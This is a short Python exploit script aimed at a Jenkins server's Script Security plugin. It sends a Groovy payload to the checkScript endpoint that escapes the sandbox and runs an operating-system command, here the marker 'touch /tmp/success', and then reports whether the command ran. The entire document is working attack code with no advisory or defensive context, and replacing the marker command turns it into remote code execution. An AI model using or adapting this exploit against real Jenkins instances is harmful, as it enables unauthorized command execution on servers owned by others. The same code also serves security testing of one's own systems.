# import necessary libraries
import requests

# define the base URL for the Jenkins server
base_url = "http://localhost:9080"

# define the endpoint for the vulnerable function
endpoint = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"

# define the payload to be sent in the request
payload = {
    "sandbox": "true",
    "value": "public class x {\n  public x(){\n    \"touch /tmp/success\".execute()\n  }\n}"
}

# send the request to the vulnerable endpoint
response = requests.get(base_url + endpoint, params=payload)

# check if the request was successful
if response.status_code == 200:
    print("Command executed successfully!")
else:
    print("Command execution failed.")